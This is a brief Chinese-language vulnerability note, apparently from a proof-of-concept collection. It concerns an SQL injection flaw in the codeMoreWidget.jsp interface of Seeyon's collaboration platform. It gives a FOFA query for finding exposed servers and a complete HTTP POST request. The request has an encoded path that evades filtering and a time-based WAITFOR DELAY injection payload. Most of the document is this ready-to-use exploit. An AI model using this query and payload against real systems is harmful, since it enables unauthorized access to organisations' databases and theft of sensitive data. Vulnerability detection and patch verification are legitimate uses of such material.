**fofa**

```
body="applyTheme/css/StyleSheet.css"
```

**一、漏洞简述**

致远互联智能协同是一个信息窗口与工作界面,进行所有信息的分类组合和聚合推送呈现。通过面向角色化、业务化、多终端的多维信息空间设计,为不同组织提供协同门户,打破组织内信息壁垒, 构建统一协同沟通的平台，其接口codeMoreWidget.jsp存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

**二、漏洞检测poc**

```yaml
POST /common/codeMoreWidget.js%70 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

code=1';WAITFOR DELAY '0:0:5'--
```

